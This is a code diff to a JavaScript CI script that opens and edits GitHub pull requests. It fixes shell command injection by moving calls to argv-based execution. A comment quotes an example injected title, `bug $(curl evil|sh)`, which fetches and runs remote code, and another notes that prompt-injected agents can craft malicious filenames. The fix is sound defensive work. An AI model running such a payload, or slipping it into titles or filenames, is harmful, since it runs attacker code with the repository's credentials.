@@ -39,6 +39,30 @@ const shQuiet = (cmd, opts = {}) => {
   }
 };
 
+/**
+ * Runs a command from an argv array, never through a shell.
+ *
+ * `sh` interpolates into /bin/sh, which is fine for our own literals and NOT
+ * fine for anything a stranger typed. A pull request title is end-user text
+ * straight from the widget, and wrapping it in double quotes does not contain
+ * it: sh still expands `$(...)` and backticks inside double quotes, and a
+ * trailing backslash escapes the closing quote. A report titled
+ * `bug $(curl evil|sh)` therefore executed in the customer's runner, with
+ * GH_TOKEN and REQIO_API_KEY in the environment, which also walks straight
+ * past the credential scrub that protects the agent subprocess.
+ *
+ * Anything carrying report text MUST go through this. There is no quoting
+ * fix for the shell path, only argv.
+ */
+const run = (file, args, opts = {}) => {
+  try {
+    const out = execFileSync(file, args, { encoding: "utf8", stdio: "pipe", ...opts });
+    return { ok: true, out: (out ?? "").toString().trim() };
+  } catch (error) {
+    return { ok: false, out: `${error.stdout ?? ""}${error.stderr ?? ""}`.trim() };
+  }
+};
+
 const setOutput = (key, value) => {
   if (process.env.GITHUB_OUTPUT) appendFileSync(process.env.GITHUB_OUTPUT, `${key}=${value}\n`);
 };
@@ -96,9 +120,13 @@ const isWorkable = (feature) => {
 
 /** The pull request on this branch, in any state, or null if there is none. */
 const findPullRequest = (branch) => {
-  const listed = shQuiet(
-    `gh pr list --head ${branch} --state all --json number,url,state,isDraft --limit 1`,
-  );
+  const listed = run("gh", [
+    "pr", "list",
+    "--head", branch,
+    "--state", "all",
+    "--json", "number,url,state,isDraft",
+    "--limit", "1",
+  ]);
   if (!listed.ok) return null;
   const body = listed.out.trim();
   if (!body || body === "[]") return null;
@@ -219,7 +247,10 @@ const restoreTestFiles = () => {
   const testFiles = changed.out
     .split("\n")
     .filter((f) => /(^|\/)(tests?|__tests__|spec)\//.test(f) || /\.(test|spec)\.[a-z]+$/.test(f));
-  for (const file of testFiles) shQuiet(`git checkout -- "${file}"`);
+  // argv, not a shell string: the agent chooses these filenames, and an agent
+  // acting on an injected instruction can create one containing shell
+  // metacharacters purely to get it executed here.
+  for (const file of testFiles) run("git", ["checkout", "--", file]);
   return testFiles;
 };
 
@@ -405,7 +436,6 @@ const handleOne = async (cfg, summary, opts) => {
   const bodyFile = path.join(process.env.RUNNER_TEMP || ".", `reqio-pr-${feature.id}.md`);
   writeFileSync(bodyFile, body);
 
-  const quotedTitle = `"${subject.replace(/"/g, '\\"')}"`;
   let prUrl;
 
   if (claim.pr) {
@@ -413,9 +443,11 @@ const handleOne = async (cfg, summary, opts) => {
     // its commits, so only the title, body and draft state still need to catch
     // up with the new outcome. Opening a second pull request on the same head
     // is not possible anyway.
-    const edited = shQuiet(
-      `gh pr edit ${claim.pr.number} --title ${quotedTitle} --body-file "${bodyFile}"`,
-    );
+    const edited = run("gh", [
+      "pr", "edit", String(claim.pr.number),
+      "--title", subject,
+      "--body-file", bodyFile,
+    ]);
     if (!edited.ok) {
       console.error(`[reqio] could not update pull request for ${feature.id}: ${edited.out}`);
       return false;
@@ -423,14 +455,19 @@ const handleOne = async (cfg, summary, opts) => {
     // An attempt that now has code and no open questions has stopped being a
     // draft, and nobody will review what still looks unfinished.
     if (!draft) {
-      const ready = shQuiet(`gh pr ready ${claim.pr.number}`);
+      const ready = run("gh", ["pr", "ready", String(claim.pr.number)]);
       if (!ready.ok) console.error(`[reqio] could not mark ${claim.pr.url} ready: ${ready.out}`);
     }
     prUrl = claim.pr.url;
   } else {
-    const created = shQuiet(
-      `gh pr create --base ${opts.baseBranch} --head ${branch} --title ${quotedTitle} --body-file "${bodyFile}"${draft ? " --draft" : ""}`,
-    );
+    const created = run("gh", [
+      "pr", "create",
+      "--base", opts.baseBranch,
+      "--head", branch,
+      "--title", subject,
+      "--body-file", bodyFile,
+      ...(draft ? ["--draft"] : []),
+    ]);
     if (!created.ok) {
       console.error(`[reqio] could not open a pull request for ${feature.id}: ${created.out}`);
       return false;
